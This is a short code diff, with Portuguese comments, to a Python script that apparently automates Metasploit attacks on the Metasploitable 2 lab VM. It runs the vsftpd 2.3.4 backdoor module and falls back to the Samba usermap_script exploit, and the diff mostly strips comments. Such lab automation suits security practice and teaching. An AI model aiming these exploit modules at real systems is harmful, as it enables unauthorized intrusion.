@@ -57,8 +57,6 @@ def main():
         return
 
     # --- TESTE 1: VSFTPD (Backdoor na Porta 21) ---
-    # Este eh o exploit mais confiavel do Metasploitable 2.
-    # Se este falhar, temos um problema de rede.
     success_ftp = test_exploit(
         client, 
         "unix/ftp/vsftpd_234_backdoor", 
@@ -70,12 +68,11 @@ def main():
         return
 
     # --- TESTE 2: Samba Usermap (Porta 139/445) ---
-    # Caso o FTP tenha falhado por firewall, tentamos o Samba.
     print("\n[INFO] Tentando alternativa (Samba)...")
     success_samba = test_exploit(
         client,
         "multi/samba/usermap_script",
-        {"RPORT": 139} # Ou 445
+        {"RPORT": 139} 
     )
     
     if success_samba:
